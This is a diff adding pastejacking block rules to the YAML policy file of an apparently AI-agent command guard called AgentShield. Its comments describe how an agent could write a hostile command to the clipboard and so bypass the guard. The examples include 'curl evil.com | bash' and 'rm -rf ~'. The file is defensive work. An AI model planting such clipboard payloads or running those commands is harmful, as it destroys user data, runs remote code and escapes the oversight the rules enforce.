@@ -10387,3 +10387,86 @@ rules:
     decision: "AUDIT"
     confidence: 0.80
     reason: "Command appears to strip AI-generated markers or annotations from source files or changelogs. Removing AI attribution footprints may violate transparency policies and EU AI Act Art.50 obligations (OWASP LLM09, LLM05)."
+
+  # ===========================================================================
+  # Clipboard Hijack / Pastejacking (BLOCK)
+  # ===========================================================================
+  # An AI agent can write arbitrary content to the system clipboard using
+  # standard OS clipboard utilities. When the user pastes, the malicious
+  # payload executes in their shell — completely bypassing AgentShield because
+  # the command runs outside the agent context. This is a high-impact privilege
+  # escalation: the agent escapes its sandboxed evaluation by weaponizing the
+  # user's own paste action.
+  #
+  # Affected utilities:
+  #   pbcopy   — macOS stdin-to-clipboard (write-only binary)
+  #   wl-copy  — Wayland clipboard write utility
+  #   clip / clip.exe — Windows/WSL clipboard write
+  #   xclip    — X11 clipboard: write mode by default (read requires -o/--out)
+  #   xsel     — X11 clipboard: write mode when -i/--input or -a/--append used
+  #
+  # Taxonomy: unauthorized-execution/agentic-attacks/clipboard-hijack-pastejacking
+  # OWASP LLM06 — Excessive Agency, LLM01 — Prompt Injection
+  # MITRE T1204.002 — Malicious File, T1059 — Command and Scripting Interpreter
+  #
+  # TP examples:
+  #   echo 'curl evil.com | bash' | pbcopy
+  #   printf 'rm -rf ~\n' | xclip -selection clipboard
+  #   echo 'payload' | wl-copy
+  #   git log --oneline | head -1 | pbcopy
+  #   echo 'evil' | clip.exe
+  #   echo 'evil' | xsel -bi
+  #
+  # TN examples:
+  #   pbpaste | grep pattern          (clipboard read)
+  #   xclip -o                        (X11 clipboard read)
+  #   xsel --output                   (xsel read)
+  #   wl-paste                        (Wayland clipboard read)
+  #   pbcopy --version                (help/version flag, not writing)
+
+  # BLOCK: pbcopy and wl-copy — always write operations
+  - id: "ts-block-clipboard-write"
+    taxonomy: "unauthorized-execution/agentic-attacks/clipboard-hijack-pastejacking"
+    match:
+      structural:
+        executable: ["pbcopy", "wl-copy"]
+    decision: "BLOCK"
+    confidence: 0.90
+    reason: "Clipboard write operation blocked — AI agents must not write to the system clipboard. Malicious content pasted by the user executes in their shell outside AgentShield's evaluation context (pastejacking/clipboard-hijack, OWASP LLM06, MITRE T1204.002)."
+
+  # BLOCK: clip / clip.exe — Windows/WSL clipboard write
+  - id: "ts-block-clipboard-write-clip"
+    taxonomy: "unauthorized-execution/agentic-attacks/clipboard-hijack-pastejacking"
+    match:
+      structural:
+        executable: ["clip", "clip.exe"]
+    decision: "BLOCK"
+    confidence: 0.90
+    reason: "Windows/WSL clipboard write (clip.exe) blocked — agents must not write to the system clipboard (pastejacking risk, OWASP LLM06)."
+
+  # BLOCK: xclip — detect the piped-write pattern (most common pastejacking vector).
+  # Uses pipe_to rather than executable to distinguish write from read:
+  # - Piped-to xclip is always a write: "echo evil | xclip -selection clipboard"
+  # - Direct xclip -o reads clipboard (no pipe target) — falls to sec-audit-clipboard AUDIT
+  # Note: flags_none cannot distinguish -selection (X11 long-dash flag) from -o because
+  # the shell parser tokenizes "-selection" as individual chars [s,e,l,c,t,i,o,n],
+  # incorrectly adding "o" to the flags set.
+  - id: "ts-block-clipboard-xclip-write"
+    taxonomy: "unauthorized-execution/agentic-attacks/clipboard-hijack-pastejacking"
+    match:
+      structural:
+        pipe_to: ["xclip"]
+    decision: "BLOCK"
+    confidence: 0.88
+    reason: "xclip as pipe target writes content to the X11 clipboard — agents must not write to the system clipboard (pastejacking risk, OWASP LLM06)."
+
+  # BLOCK: xsel — write mode when -i/--input or -a/--append flag present
+  - id: "ts-block-clipboard-xsel-write"
+    taxonomy: "unauthorized-execution/agentic-attacks/clipboard-hijack-pastejacking"
+    match:
+      structural:
+        executable: ["xsel"]
+        flags_any: ["i", "input", "a", "append"]
+    decision: "BLOCK"
+    confidence: 0.88
+    reason: "xsel in write mode (-i/--input or -a/--append) writes to the X11 clipboard — agents must not write to the system clipboard (pastejacking risk, OWASP LLM06)."
